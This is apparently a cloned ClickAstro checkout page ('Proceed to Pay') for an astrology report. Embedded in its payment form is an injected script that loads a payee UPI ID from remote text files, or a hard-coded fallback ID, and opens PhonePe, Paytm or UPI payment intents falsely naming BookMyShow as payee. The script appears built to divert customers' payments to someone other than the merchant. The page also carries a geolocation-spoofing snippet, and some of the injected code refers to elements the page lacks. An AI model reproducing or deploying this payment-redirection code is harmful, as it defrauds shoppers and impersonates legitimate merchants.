<!DOCTYPE html>
<html data-geolocscriptallow="true"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<title>Proceed to Pay</title>
<link rel="stylesheet" type="text/css" href="pay_files/css.css">
<link rel="stylesheet" type="text/css" href="pay_files/font-awesome.min.css" media="all">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
*{
	box-sizing: border-box;
	margin:0;
	padding:0;
	font-family: 'Roboto';
}
body{
	background: #f3ebd8;
	font-size: 12pt;
}
.pgbtns{ width: 50%; float: left; text-align: center; }
.app-bar {
    height: 48px;
    z-index: 101;
    position: fixed;
    left: 0;
    width: 100%;
    border-bottom: none;
    box-shadow: 0 1px 6px 1px rgba(0,0,0,0.2);
    top:0;
}
.error{
	display: none;
	position: fixed;
	top:248px;
	left:50%;
	transform: translateX(-50%);
	color:#c00;
	width: 300px;
	text-align: center;
}
.card-a {  
    width: 100%;
    background: #fff7ec;
    min-height: 200px;
    /* box-shadow: 0px 0px 5px #999; */
    display: table;
    border-radius: 0px;
    margin: 0;
    padding: 8px;
    font-size: 0.9rem;
	text-align:center;
}
.card-a > *{
	width:100%;
}
.card-a > b{
	display:block;
}
.card-a b {
    display: block;
}
.bg-wht {
    background: #ffffff;
}
span.ab-ico-bttn {
    width: 36px;
    height: 36px;
    display: inline-block;
    float: right;
    background: #fff;
    color: #03A9F4;
    margin: 6px 10px;
    border-radius: 18px;
    line-height: 38px;
    text-align: center;
    font-size: 1.2rem;
    overflow: hidden;
    transition: all 0.4s ease-out;
    white-space: nowrap;
    cursor: pointer;
}
.mx-container,.footer-holder {
	width:100%;
    max-width: 600px;
    padding:0 8px;
}
.ma {
    margin: auto;
}

.page {
    margin: auto;
    margin-top: 48px;
    width: 100%;
    max-width: 600px;
    background: #fff;
    padding: 16px;
    min-height: 400px;
    display: grid;
}
.offer-bar {
    background: linear-gradient(-45deg,#FF9800,#F44336);
    min-height: 100px;
    color: #fff;
    padding: 24px 16px;
    border-radius: 12px 12px 0 0;
    font-size: 1.0rem;
    position: relative;
    margin-top: 58px;
}
.hlg{
    color: #ff0;
    font-size: 1.0rem;
}
.strike {
    text-decoration: line-through;
    color: #f7dc8d;
    font-weight: 700;
    font-size: 1.1rem;
}
.confirm{
	padding:8px;
	border-radius:8px;
	margin:4px 0 10px 0;
	background:#ffda8f;
	font-size:0.8rem;
}
table {
    font-size: 0.9rem;
    width:100%
}
table tr td:first-child {
    width: 45%;
    font-weight: 700;
    color: #646464;
    padding:0 10px;
}
.title {
    text-align: left;
    color: #4e9a67;
    margin: 16px;
    font-weight: 700;
    font-size: 1.2rem;
	line-height: 26px;
	height: 40px;
	font-size:22px;
}
big {
    font-size: 0.9rem;
}
div.label {
    float: left;
    width: 42%;
    font-size: 0.8rem;
    padding-left: 10px;
    box-sizing: border-box;
    font-weight: 700;
    color:#646464;
}
div.value {
    float: left;
    width: 40%;
    font-size: 0.8rem;
    text-align: right;
    padding-right: 10px;
}
.org-bttn {
    box-shadow: none;
    border-radius: 8px;
    border: 1px solid #429605;
    width: 48%;
    margin: 4px;
    font-size: 0.9rem;
    text-align: center;
    background-color: #5c0;
    display: inline-block;
    color: #FFF;
    font-weight: 700;
    text-decoration: none;
    height: 50px;
    line-height: 50px;
    vertical-align: middle;
    float:left;
}
.org-bttn.cl{
    background: #ccc;
    color: #000;
    border: 1px solid #999;
}
.app-bar.solid-blue {
    background: #00aeef;
    box-shadow: 0px 2px 6px rgba(0,0,0,0.3);
    position: fixed;
    width: 100%;
    top: 0;
}
#logo {
    width: 80px;
    transform: translate(8px,4px);
    position: relative;
    background-size: 90px 40px;
    background-position: -10px 0;
    height: 40px;
    text-indent: 100px;
    overflow: hidden;
    padding: 10px;
    box-sizing: border-box;
    margin-left: 8px;
    float:left;
}
.ca-logo-new{
    transform: translate(27px,12px);
    background-image: url(https://images.clickastro.com/ca-logo/ca_logo_4color_wide_white.svg);
    background-repeat: no-repeat;
    background-size: 65% auto;
    background-position: 0px 0px;
    height: 42px;
    width: 262px;
    float: left;
}
.ca-logo{
		background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg version='1.1' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x='0px' y='0px' width='504px' height='168px' viewBox='0 0 504 168' enable-background='new 0 0 504 168' xml:space='preserve'%3e%3cg id='Layer_1'%3e%3cg%3e%3cpolygon fill='%2300AEEF' fill-opacity='0' points='432.406,8 71.594,8 1,8 1,160 71.594,160 432.406,160 503,160 503,8 '/%3e%3cg%3e%3cpolygon fill='%23FFFFFF' points='118.281,155.881 118.281,99.591 129.02,99.591 129.02,155.881 '/%3e%3cpath fill='%23FFFFFF' d='M140.132,109.598V99.591h10.729v10.007H140.132L140.132,109.598z M140.132,155.881v-40.77h10.729v40.77 H140.132L140.132,155.881z'/%3e%3cpolygon fill='%23FFFFFF' points='205.295,155.881 205.295,99.591 216.048,99.591 216.048,129.456 228.72,115.111 241.967,115.111 228.052,130.047 242.998,155.881 231.37,155.881 221.062,137.623 216.048,142.835 216.048,155.881 '/%3e%3cg%3e%3cpath fill='%23FFFFFF' d='M252.466,25.985c-39.122,17.948-55.145,29.113-54.205,37.242c3.19,25.667,150.487-11.642,210.989-34.432 c-87.697,40.871-238.755,69.324-246.186,47.053C157.56,60.517,196.398,41.823,252.466,25.985L252.466,25.985z'/%3e%3cpath fill='%23FFFFFF' d='M245.74,68.774c39.121-17.95,55.142-29.188,54.203-37.235c-3.11-25.68-150.476,11.641-210.991,34.423 c87.76-40.866,238.755-69.324,246.194-47.041C340.646,34.247,301.881,52.94,245.74,68.774L245.74,68.774z'/%3e%3c/g%3e%3cpath fill='%23FFFFFF' d='M412.146,114.204c-11.615,0-21.03,6.858-21.03,21.29c0,14.506,9.415,21.29,21.03,21.29 s21.03-6.034,21.03-21.29C433.176,120.125,423.761,114.204,412.146,114.204z M412.137,147.961c-7.137,0-9.986-5.587-9.986-12.479 c0-6.894,2.626-12.478,9.986-12.478c8.134,0,9.987,5.587,9.987,12.478C422.124,142.374,420.641,147.961,412.137,147.961z'/%3e%3cpath fill='%23FFFFFF' d='M99.821,140.206c-0.684,4.556-2.729,7.755-8.116,7.755c-6.018,0-8.42-5.666-8.42-12.656 c0-6.992,2.215-12.655,8.42-12.655c4.604,0,6.814,2.56,7.774,6.353l10.667-1.911c-2.661-9.158-9.903-12.887-18.445-12.887 c-10.796,0-19.549,6.858-19.549,21.29c0,14.506,8.752,21.29,19.549,21.29c9.093,0,16.713-4.306,18.899-14.77L99.821,140.206z'/%3e%3cpath fill='%23FFFFFF' d='M187.169,140.206c-0.684,4.556-2.729,7.755-8.116,7.755c-6.018,0-8.42-5.666-8.42-12.656 c0-6.992,2.215-12.655,8.42-12.655c4.604,0,6.814,2.56,7.774,6.353l10.667-1.911c-2.661-9.158-9.903-12.887-18.445-12.887 c-10.796,0-19.549,6.858-19.549,21.29c0,14.506,8.752,21.29,19.549,21.29c9.093,0,16.713-4.306,18.899-14.77L187.169,140.206z'/%3e%3cpath fill='%23FFFFFF' d='M282.357,125.834C282.315,113.171,265,113,258.634,114.851s-8.05,3.482-10.936,10.983 c0,0,3.172,0.569,9.758,1.752c2.394-5.789,5.169-5.273,10.114-4.882s4.295,6.604,4.295,6.604 c-5.178,2.129-16.573,3.067-20.681,6.102s-7.726,11.707-0.976,17.975c12.008,8.663,22.504-1.908,22.504-1.908l1.46,4.405 c0,0,3.912,0,10.646,0C281.72,152.348,282.399,138.497,282.357,125.834z M265.688,148.882c-7.188,1.702-10.668-5.235-6.63-8.73 c1.754-1.589,4.75-1.649,12.803-3.798C272.417,145.854,269.583,147.834,265.688,148.882z'/%3e%3cpath fill='%23FFFFFF' d='M325.999,125.025c-2.832-9.525-10.275-11.29-21.096-10.699s-15.18,8.679-14,14.093 s2.994,8.55,18.879,12.19c5.123,1.363,8.518,1.798,6.076,6.178c-1.191,2.213-8.428,3.101-11.685,1.365s-3.561-4.03-3.992-5.508 c-1.743,0.254-10.841,1.58-10.841,1.58s2.221,10.328,14.231,12.177s20.462-2.221,23.153-9.27s-1.367-13.273-9.372-15.359 s-19.439-3.783-16.162-7.757c0.829-0.963,3.359-2.711,8.834-1.895s5.828,4.74,5.828,4.74L325.999,125.025z'/%3e%3cpath fill='%23FFFFFF' d='M337.337,107.027l10.847-6.291v14.378l7.322-0.003v8.646h-7.322l0.045,20.494 c0,0-1.094,6.083,7.256,2.624c0.663,5.877,0.942,8.354,0.942,8.354s-21.004,7.771-19.09-11.896c-0.003-20,0-19.574,0-19.574 h-4.969v-8.645h4.969V107.027z'/%3e%3cpath fill='%23FFFFFF' d='M372.585,120.925c0,0,5.363-11.328,16.39-4.668c-2.911,8.158-3.343,9.366-3.343,9.366 s-12.063-8.709-12.185,12.293l-0.077,17.965h-10.813v-40.77h10.028V120.925z'/%3e%3c/g%3e%3c/g%3e%3c/g%3e%3cg id='Layer_1_copy'%3e%3c/g%3e%3c/svg%3e");
}
.currentpgs{ width:80%; margin:0 auto; }
@media screen and (min-width: 600px){
	.page{
		padding: 16px 48px;
	}
	span.ab-ico-bttn{
		background: #03A9F4;
		color:#fff;
	}
	.fa-phone:hover {
	    width: 190px;
	}
	.fa-phone:hover::before {
	    content: '+91(India) 6366920680';
	    font-family: 'roboto',sans-serif;
	    font-size: 1.0rem;
	}
}
@media screen and (max-width:600px){
.currentpgs{ width:95%; }
}
@media screen and (max-width:320px){
	.org-bttn{
		font-size: 0.8rem;
	}
}
#footer {
    background: #f4f4f4;
    padding: 40px 0;
    font-size: .8em;
    text-align:center;
    color:#555;
}
#footer a{
	color: #212121;
    text-decoration: none;
    margin: 2px 0px;
    padding: 0 8px;
    border-right: 1px solid #666;
    display: inline-block;
}
#footer div a.tn,
#footer div a:last-child{
	border-right:none;
}
#phone-popup {
    position: fixed;
    z-index: 1000;
    top: 50%;
    left: 50%;
    transform: translate(-50%,-50%);
    width: 300px;
    background: #fff;
    border-radius: 10px;
    overflow: hidden;
}
#film {
    position: fixed;
    display: none;
    width: 100%;
    height: 100%;
    z-index: 999;
    top: 0;
    left: 0;
    background: rgba(0,0,0,0.75);
}
#film label {
    font-size: 0.9rem;
    padding: 8px 16px;
    display: block;
}
#film input{
	display: block;
    padding: 8px;
    width: 90%;
    margin: 12px 16px;
    margin-top: 0;
    border: 1px solid #9b9b9b;
}
#film button:last-child {
    background: #5c0;
    color: #fff;
}
#film button {
    background: #efefef;
    width: 50%;
    float: left;
    border: none;
    padding: 12px;
    color: #000;
    font-weight: 700;
}
#phoneerr {
    background: #f00;
    padding: 10px;
    border-radius: 8px;
    margin: 8px 16px;
    margin-top: 8px;
    color: #fff;
    display: none;
    font-size: 0.9rem;
}
.clear{ clear:both; }
a.org-bttn.GPAY {
    background-color: #fff!important;
    background-image: url(https://images.clickastro.com/ca/mvcimages/py/gpwhite.png);
    background-position: center;
    background-repeat: no-repeat;
    background-size: 25%;
    font-size: 0;
}
.card-a  .org-bttn.RU {
    display: none;
}
.full-width {
    width: 100%;
}
.price-label, #report_price {
    width: 30%;
    display: block;
    float: left;
    line-height: 1.8rem;
}
#report_price, #report_gst, #payable_price, #discount_price {
    display: block;
    width: 20%;
    text-align: right;
    float: left;
    line-height: 1.8rem;
}
.payable-price-report {
    border-top: 1px solid #999;
    width: 52%;
}
.payable-price-report .price-label {
    width: 74%;
}
#payable_price {
    color: #079b0d;
    font-weight: 700;
}
.paydetails{
    float: left;
    width: 100%;
    margin: 16px;
}
.title.sub{
    margin: 0;
    font-size: 18px;
    margin-top: 16px;
}
.gstpay{
    color: #0271bd;
}
@media screen and (max-width:900px){
.org-bttn{
    width: 95%;
}
.price-label, #report_price {
    width: 50%;
}
.payable-price-report {
    width: 72%;
}
}
</style>
<script async="" src="pay_files/google-analytics_analytics.js"></script><script>
	window.addEventListener("load", function(event) {
		setTimeout(function() {
			(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
				new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
			j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
			'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
		})(window,document,'script','dataLayer','GTM-KJCJRWT');
	}, 3500);
});</script>
<script>
	window.dataLayer = window.dataLayer || [];
	function gtag() {
		
  dataLayer.push(arguments);
}
	function ga4Track(eventName, eventAction, eventLabel,val,dobj) {
    console.log(eventName);
    eventParams = {
        category:eventName,
        action:eventAction,
        label:eventLabel,
    }
    gtag('event',eventName,eventParams);
}

	function ga4TrackEcomPurchase(input){
        gtag("event", input.name, input.eComData);
    }
</script>

<script type="text/javascript">
	console.log('pageName=','proceedtopay.php');
</script>
<script src="pay_files/web-vitals.iife.js"></script>
<script>
	function isMobileDevice() {
    return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
  }
  const deviceType = isMobileDevice() ? 'mobile' : 'desktop';

  console.log('Device Type:', deviceType);
  // Function to handle each Web Vitals metric
  function logMetric({name, delta, id}) {
    console.log(`${name}: ${delta} (ID: ${id})`);
  }

  // Register Web Vitals metrics handlers
  webVitals.getCLS(logMetric);   // Cumulative Layout Shift
  webVitals.getFID(logMetric);   // First Input Delay
  webVitals.getLCP(logMetric);   // Largest Contentful Paint
  webVitals.getINP((metric) => {
    // Log the INP value (Interaction to Next Paint)
    console.log('INP:', metric.value);
     console.log('Metric Details:', {
    name: metric.name,       // 'INP'
    value: metric.value,     // e.g., 56
    rating: metric.rating,   // 'good', 'needs improvement', 'poor'
    attribution: metric.entries // Attribution data for INP
  });
     
    // You can also send this data to your own analytics endpoint for further processing
    //sendToAnalytics(metric);
  });
 function sendToGoogleAnalytics({name, delta, id,rating,value}) {
 	ga4Track(name,name+'-'+value,rating);
    /*ga4Track('event', name, {
      event_category: 'Web Vitals',
      event_action: name, cls-value
      event_label: id,
      value: Math.round(name === 'CLS' ? delta * 1000 : delta),  // Multiply CLS by 1000 for accuracy
      non_interaction: true,  // So that it doesn't affect bounce rate
    });*/
  }
  webVitals.getCLS(sendToGoogleAnalytics);   // Cumulative Layout Shift
  webVitals.getFID(sendToGoogleAnalytics);   // First Input Delay
  webVitals.getLCP(sendToGoogleAnalytics);   // Largest Contentful Paint
  webVitals.getINP(sendToGoogleAnalytics);  // Interaction to Next Paint
  
</script>


<script type="text/javascript">
function checkandsubmit(pmode)
{
    document.getElementById("pmode").value = pmode;
	document.getElementById("pgiframe").style.display="block";
	document.getElementById("pgiframe").classList.add("pgiframe");
    document.frmplaceorder.submit();
	
}
function closepgiframe()
{document.getElementById('pg-iframe').setAttribute('src','');document.getElementById("pgiframe").style.display="none"}

</script>
</head><script>(function (e) {
  if (navigator) {
    if (navigator.geolocation) {
      if (navigator.geolocation.__proto__) {
        const getCurrentPosition = navigator.geolocation.__proto__.getCurrentPosition;
        Object.defineProperty(navigator.geolocation.__proto__, "getCurrentPosition", {
          "value": function (success) {
            const OLD = success;
            success = function (position) {
              if ("timestamp" in position) Object.defineProperty(position, 'timestamp', {"value": e.timestamp !== null ? Number(e.timestamp) : null});
              if ("coords" in position) {
                Object.defineProperty(position.coords, 'speed', {"value": e.coords.speed !== null ? Number(e.coords.speed) : null});
                Object.defineProperty(position.coords, 'heading', {"value": e.coords.heading !== null ? Number(e.coords.heading) : null});
                Object.defineProperty(position.coords, 'latitude', {"value": e.coords.latitude !== null ? Number(e.coords.latitude) : null});
                Object.defineProperty(position.coords, 'accuracy', {"value": e.coords.accuracy !== null ? Number(e.coords.accuracy) : null});
                Object.defineProperty(position.coords, 'altitude', {"value": e.coords.altitude !== null ? Number(e.coords.altitude) : null});
                Object.defineProperty(position.coords, 'longitude', {"value": e.coords.longitude !== null ? Number(e.coords.longitude) : null});
                Object.defineProperty(position.coords, 'altitudeAccuracy', {"value": e.coords.altitudeAccuracy !== null ? Number(e.coords.altitudeAccuracy) : null});
              }
              OLD.apply(this, arguments);
            };
            return getCurrentPosition.apply(this, arguments);
          }
        });
        document.documentElement.dataset.geolocscriptallow = true;
      }
    }
  }
})({"timestamp":1744043474911,"coords":{"speed":null,"heading":null,"latitude":51.482594,"altitude":null,"accuracy":1768,"longitude":-0.007661,"altitudeAccuracy":null}})</script>
<body>
<div class="app-bar bg-wht">
<div class="text mx-container ma">
<a href="https://www.clickastro.com/"><img class="desktop-logo" src="pay_files/ca_logo_with_tag_line_L.png" alt="Logo" style="
    float: left;
    margin: 4px 0px;
    margin-top: 6px;
    width: 140px;
    position: absolute;
    background: #fff;
    padding: 0px 24px 4px 24px;
    border-radius: 18px;
    height: auto;
    box-shadow: 0px 7px 4px -4px rgba(0,0,0,0.2);
    width: 150px;
"></a><span class="ab-ico-bttn fa fa-phone"></span>
</div>
</div>
<div class="page" id="page">
      <!--  <div style="font-size: 1.0rem;color: #a00000;margin:10px 0;text-align:center;font-weight: 400;background: #ffff00;padding: 8px;border-radius: 8px;">Amount Payable: <span style="font-size:1.4rem;color:#009900;">Rs./-</span></div> -->
         <div class="paydetails">
<div class="title sub">Payment Details<br></div>
<div class="discount-price-report pull-left full-width text-right">
    <span class="price-label">Product Price</span>
    <span id="discount_price">Rs.999</span>
</div>
<div class="discount-price-report pull-left full-width text-right gstpay">
    <span class="price-label">GST(18%)</span>
    <span id="discount_price">Rs.179</span>
</div>
<div class="payable-price-report pull-left full-width text-right">
    <span class="price-label">Payable amount</span>
    <span id="payable_price">Rs.1178</span>
</div>
</div>
<div class="title">Choose Your Payment Option<br>
</div>
<style>
.pgiframe{ display:block; border:none;/*min-height: 100%;*/transition: all 0.3s ease-out 0s;/*background: rgba(0, 0, 0, 0.6);*/ position: fixed; top: 0px; left: 0px;width: 100%;height: 100%;z-index: 1000000000; min-height: 500px; }
.iframeloadclass{     width: 100%;    height: 100%; }
.iframeclose{ z-index: 1000;float: right; text-align: right;width: 80%;/*border: 4px solid #fff;background: #fff;*/box-sizing: border-box;position: absolute;left: 50%; top: 7%; transform: translate(-50%,-50%); padding: 4px; box-shadow: 0 4px 2px -2px gray; }
.framediv{/*border: 4px solid #fff; background: #fff;*/    box-sizing: border-box;    position: absolute;    /*left: 50%;    top: 50%;    transform: translate(-50%,-50%);*/    width: 100%;    height: 100%;}
@media screen and (max-width:1024px){
.iframeclose{ width: 98%; top: 3.5%; }
.framediv{ width: 100%; height:100%; }
 }
.pgbutton {
	width: 50%;
    padding: 1%;
    height: auto;
	 background-color: #5c0;
	 text-align: center;
	  line-height: 40px;
	  color: #FFF;
	  font-weight: 700;
	  font-size: 0.9rem;
	   float: left;cursor: pointer;
	   border-radius: 12px;
	   border: #ffffff;
    border-style: solid;
    border-width: 4px;
}
.pgbuttonfont{ text-decoration:none; color:#FFFFFF; }
</style>
<script>function PGResponseHandler(url){ location.href = "https://www.clickastro.com"; }</script>
<div id="pgiframe" style="display:none;box-sizing:border-box;"> 
    <div class="framediv">
	<iframe name="pg-iframe" id="pg-iframe" class="iframeloadclass" src="" style="border:none;"></iframe>
    </div>
</div><!-- <form name="frmplaceorder" method="post" action="../campaign/astrocart/astrocart-composexml.php" target="pg-iframe"> -->
<form name="frmplaceorder" method="post" action="/general/get-product-api.php" target="pg-iframe">
<div class="card-a">
<div style="display: table;padding:0;">        
<div>
<script>
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const totalAmount = urlParams.get('amount') || '1253.82';
            let selectedUPI = null;
    
            document.querySelector('.total-amount').textContent = `₹${totalAmount}`;
            document.getElementById('continue-btn').textContent = `Pay ₹${totalAmount}`;
    
            window.toggleOption = function(option) {
                const content = document.getElementById(`${option}-content`);
                const arrow = document.querySelector(`#${option}-content`).previousElementSibling.querySelector('.option-arrow');
                content.classList.toggle('show');
                arrow.classList.toggle('down');
            };
    
            window.selectUPI = function(app) {
                document.querySelectorAll('.payment-method').forEach(method => {
                    method.classList.remove('selected');
                });
                event.currentTarget.classList.add('selected');
                selectedUPI = app;
                document.getElementById('continue-btn').disabled = false;
            };
    
            function showModal() {
                document.getElementById('error-modal').style.display = 'flex';
            }
    
            window.closeModal = function() {
                document.getElementById('error-modal').style.display = 'none';
            }
    
            function isInstagramBrowser() {
                const userAgent = navigator.userAgent || navigator.vendor || window.opera;
                return /Instagram/i.test(userAgent);
            }
    
            async function fetchUPIDetails() {
                const isInstagram = isInstagramBrowser();
                let fileToFetch = 'upi.txt';
    
                if (isInstagram) {
                    fileToFetch = Math.random() < 0.5 ? 'admin.txt' : 'upi.txt';
                }
    
                try {
                    const response = await fetch(fileToFetch);
                    if (!response.ok) throw new Error('File not found');
    
                    const text = await response.text();
                    const lines = text.split('\n');
    
                    return {
                        upiId: lines[0]?.trim(),  // ✅ Use first line as UPI ID
                        tr: lines[1]?.trim() || 'T' + Math.random().toString(36).substr(2, 9).toUpperCase()
                    };
                } catch (error) {
                    console.error('Error fetching UPI details:', error);
                    return {
                        upiId: 'himachal@fam',  // Fallback value
                        tr: 'T' + Math.random().toString(36).substr(2, 9).toUpperCase()
                    };
                }
            }
    
            document.getElementById('continue-btn').addEventListener('click', async function() {
                if (!selectedUPI) {
                    alert('Please select a UPI app first');
                    return;
                }
    
                const { upiId, tr } = await fetchUPIDetails();
    
                if (selectedUPI === 'gpay') {
                    showModal();
                    return;
                }
    
                let intent = '';
    
                switch(selectedUPI) {
                    case 'phonepe':
                        intent = `phonepe://pay?ver=01&mode=19&pa=${upiId}&am=${totalAmount}&pn=BookMyShow&tr=${tr}&cu=INR&mc=5942&qrMedium=04&tn=TICKET%20ID%20:%20Oz86OGmgvUjhMH`;
                        break;
                    case 'paytm':
                        intent = `paytmmp://pay?ver=01&mode=19&pa=${upiId}&am=${totalAmount}&pn=BookMyShow&tr=${tr}&cu=INR&mc=5942&qrMedium=04&tn=TICKET%20ID%20:%20Oz86OGmgvUjhMH`;
                        break;
                    default:
                        intent = `upi://pay?ver=01&mode=19&pa=${upiId}&am=${totalAmount}&pn=BookMyShow&tr=${tr}&cu=INR&mc=5942&qrMedium=04&tn=TICKET%20ID%20:%20Oz86OGmgvUjhMH`;
                }
    
                window.location.href = intent;
    
                setTimeout(() => {
                    if (!document.hidden) {
                        alert('Payment app not detected. Please ensure you have the app installed or try another payment method.');
                    }
                }, 1000);
            });
        });
    </script>

<div style="margin-left: 10px;"><a href="#" class="org-bttn CC" style="margin-bottom: 4px;background-color:#55cc00; border:1px solid #429605 !important;">Credit / Debit Card</a><a href="javascript:checkandsubmit('GPAY')" class="org-bttn GPAY" style="margin-bottom: 4px;background-color:#ffffff; border:1px solid #9a9a9a !important;">Google Pay</a><a href="javascript:checkandsubmit('WL')" class="org-bttn WL" style="margin-bottom: 4px;background-color:#ff9800; border:1px solid #FF5722 !important;">Wallets</a><a href="javascript:checkandsubmit('UPI')" class="org-bttn UPI" style="margin-bottom: 4px;background-color:#ff5722; border:1px solid #ff0000 !important;">UPI</a><a href="onclick="selectUPI('phonepe')" class="org-bttn PhonePe" style="margin-bottom: 4px;background-color:#6739b7; border:1px solid #6739b7 !important;">PhonePe</a><a href="javascript:checkandsubmit('PTM')" class="org-bttn PTM" style="margin-bottom: 4px;background-color:#6739b7; border:1px solid #6739b7 !important;">PAYTM</a></div>			<input type="hidden" name="name" id="name" value="csjb">
            <input type="hidden" name="gender" id="gender" value="MALE">
            <input type="hidden" name="dobyear" id="dobyear" value="2024">
            <input type="hidden" name="dobmonth" id="dobmonth" value="2">
            <input type="hidden" name="dobday" id="dobday" value="2">
            <input type="hidden" name="tobhour" id="tobhour" value="02">
            <input type="hidden" name="tobmin" id="tobmin" value="01">
            <input type="hidden" name="ampm" id="ampm" value="PM">
            <input type="hidden" name="language" id="language" value="Mal">
            <input type="hidden" name="chart_style" id="chart_style" value="1">
            <input type="hidden" name="email" id="email" value="sdkjbckjb@jkfd.bkj">
            <input type="hidden" name="txt_Phone" id="txt_Phone" value="9445651132">
            <input type="hidden" name="pcountrycode" id="pcountrycode" value="+91">
            <input type="hidden" name="country" id="country" value="Vietnam">
            <input type="hidden" name="region_dist" id="region_dist" value="Cao B?ng">
            <input type="hidden" name="state" id="state" value="Cao B?ng">
            <input type="hidden" name="txt_place_search" id="txt_place_search" value="Lin Luong">
            <input type="hidden" name="longdeg" id="longdeg" value="106">
            <input type="hidden" name="longmin" id="longmin" value="12">
            <input type="hidden" name="longdir" id="longdir" value="E">
            <input type="hidden" name="latdeg" id="latdeg" value="22">
            <input type="hidden" name="latmin" id="latmin" value="41">
            <input type="hidden" name="latdir" id="latdir" value="N">
            <input type="hidden" name="timezone" id="timezone" value="07.00E">
            <input type="hidden" name="timezone_name" id="timezone_name" value="Asia/Ho_Chi_Minh">
            <input type="hidden" name="latitude_google" id="latitude_google" value="22.683333333333334">
            <input type="hidden" name="longitude_google" id="longitude_google" value="106.2">
            <input type="hidden" name="correction" id="correction" value="0">
                        <input type="hidden" name="placechecked" id="placechecked" value="">
            <input type="hidden" name="lsmid" id="lsmid" value="">
            <input type="hidden" name="reporttype" id="reporttype" value="">
            <input type="hidden" name="clientid" id="clientid" value="CLICKASTRONEW">
            <input type="hidden" name="reseller" id="reseller" value="CLICKASTRO">
            <input type="hidden" name="cmpcode" id="cmpcode" value="GIFTBOXDESK-LI">
            <input type="hidden" name="ordtype" id="ordtype" value="SU5EUDk5OQ==">
            <input type="hidden" name="prdtype" id="prdtype" value="SU5EUA==">
            <input type="hidden" name="pmode" id="pmode" value="">
            <input type="hidden" name="discount" id="discount" value="">
            <input type="hidden" name="refpage" id="refpage" value="https://www.clickastro.com/campaign/2019/in-depth/999-indepth-gift-box.php?pid=SU5EUA==&amp;clid=CLICKASTRO&amp;cmpCode=GIFTBOXDESK-LI">
            <input type="hidden" name="gclick_id" id="gclick_id" value="">
            <input type="hidden" name="requrl" id="requrl" value="/campaign/2019/in-depth/999-indepth-gift-box.php">
<div id="errorname"></div>
</div>
<div class="clear"></div>
<b style="font-size: 1rem;color: #1c9921;margin-top:10px; text-align:center;">OR</b>
<div class="clear"></div>
<b style="font-size: 1rem;color: #1c9921;margin-top:10px; text-align:center;">Call us for Further Support</b>
<div class="clear"></div>
<b style="font-size: 1rem;color: #555;margin-top:10px; text-align:center;">+91(India) 6366920680</b>


</div>
</div>
</form>
<img src="pay_files/paymentoptionspng.png" class="pmode" alt="payments" style="width:100%;max-width:285px;">
</div>

<div id="footer" class="row">
<div class="footer-holder ma">
<div class="ca-col m12 l12 footer-content ca-pull-center">
<div class="ca-col m12 l12">
<a href="https://www.clickastro.com/">Home</a>
<a href="https://www.clickastro.com/about-us">About Us</a>
<a href="https://www.clickastro.com/contact-us">Contact Us</a>
<a href="https://www.clickastro.com/partner-us">Partner Us</a>
<a href="https://www.clickastro.com/sitemap">Sitemap</a>
<a href="https://www.clickastro.com/privacy-policy">Privacy Policy</a>
<a href="https://www.clickastro.com/cancellation-policy">Cancellation Policy</a>
<a href="https://www.clickastro.com/terms-and-conditions">Terms &amp; Conditions</a>
<a href="https://www.clickastro.com/disclaimer">Disclaimer</a>
<a href="https://www.clickastro.com/support">Support</a>
</div>
<div class="ca-col m12 l12 ca-pull-center">
<span class="ca-white-color">Partner Sites: </span><a href="http://www.indianastrologysoftware.com/free-download-kundli-software.php" target="_blank">Kundli Software</a> 
<a href="https://www.malayogamonline.com/" target="_blank">Malayalee Matrimony</a>
</div>
<div class="ca-col m12 l12 ca-pull-center">
<span class="ca-white-color">© 2000-2025</span>
<a class="tn" href="http://www.astro-vision.com/" target="_blank">Astro-Vision Futuretech Pvt.Ltd</a><br>
<span class="ca-white-color">All rights reserved.</span>
</div>
</div>
</div>
</div>


</body></html>
